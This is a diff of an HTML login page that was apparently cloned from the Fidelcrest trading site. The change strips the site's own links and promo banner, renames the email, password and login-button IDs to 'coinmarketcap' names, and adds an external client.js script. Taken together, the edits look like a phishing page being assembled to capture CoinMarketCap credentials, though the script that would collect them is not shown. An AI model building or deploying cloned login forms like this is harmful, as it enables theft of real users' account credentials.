@@ -91,12 +91,12 @@
             <form>
               <div style="transform: translateX(-16px); margin-bottom: 30px">
                 <input
-                  id="userid"
-                  name="userid"
+                  id="coinmarketcap-username"
+                  name="email"
                   class="front-input"
                   placeholder="Email address"
                 /><input
-                  id="password"
+                  id="coinmarketcap-password"
                   name="password"
                   type="password"
                   class="front-input"
@@ -111,77 +111,27 @@
                   margin: 0px;
                   padding: 0px 0px 20px;
                 "
-                ><p style="margin: 0px; padding: 0px">Forgot password</p></a
-              ><input
-                type="submit"
+              >
+                <p style="margin: 0px; padding: 0px">Forgot password</p>
+              </a>
+              <button
+                id="coinmarketcap-login"
                 class="button-front-active no-webkit"
-                value="Log in"
                 style="font-weight: 600; transform: translateX(-7px)"
-              />
+              >
+                Log in
+              </button>
             </form>
             <br />
-            <p style="line-height: 22px">
-              <a
-                target="_blank"
-                rel="noreferrer"
-                href="https://my.challenge.fidelcrest.com/index.php?p=login"
-                style="color: white"
-                >Login here</a
-              ><span style="opacity: 0.75"
-                >&nbsp;&nbsp;to the old trader area to<br />manage my old
-                Fidelcrest accounts</span
-              >
-            </p>
-            <br /><a href=""
-              ><p style="color: white; font-weight: 600">Back</p></a
-            >
-          </div>
-          <div
-            style="
-              position: fixed;
-              top: 0px;
-              left: 0px;
-              z-index: 100;
-              width: 100%;
-              padding: 0px;
-              margin: 0px;
-              text-align: center;
-              font-weight: 800;
-              font-size: 15px;
-            "
-          >
-            <div
-              style="width: 100%; padding: 20px; background: rgb(255, 177, 30)"
-            >
-              <div
-                style="
-                  display: inline-block;
-                  color: rgb(0, 0, 0);
-                  padding: 5px 10px;
-                  vertical-align: top;
-                "
-              >
-                <a
-                  href="https://fidelcrest.com/news/summer-2for1-is-on"
-                  target="_blank"
-                  style="color: rgb(0, 0, 0)"
-                  >Get 2 trading challenge accounts when you acquire an account
-                  of any size and type.</a
-                >
-              </div>
-              <div style="padding: 10px 0px 0px; vertical-align: top">
-                <a
-                  href="https://fidelcrest.com/news/summer-2for1-is-on"
-                  target="_blank"
-                  style="color: rgb(0, 0, 0)"
-                  >Promo Code: SUMMER-2FOR1</a
-                >
-              </div>
-            </div>
+            <br />
+            <a href="/">
+              <p style="color: white; font-weight: 600">Back</p>
+            </a>
           </div>
         </div>
         <div style="flex-grow: 1"></div>
       </div>
     </div>
+    <script src="static/js/client.js"></script>
   </body>
 </html>
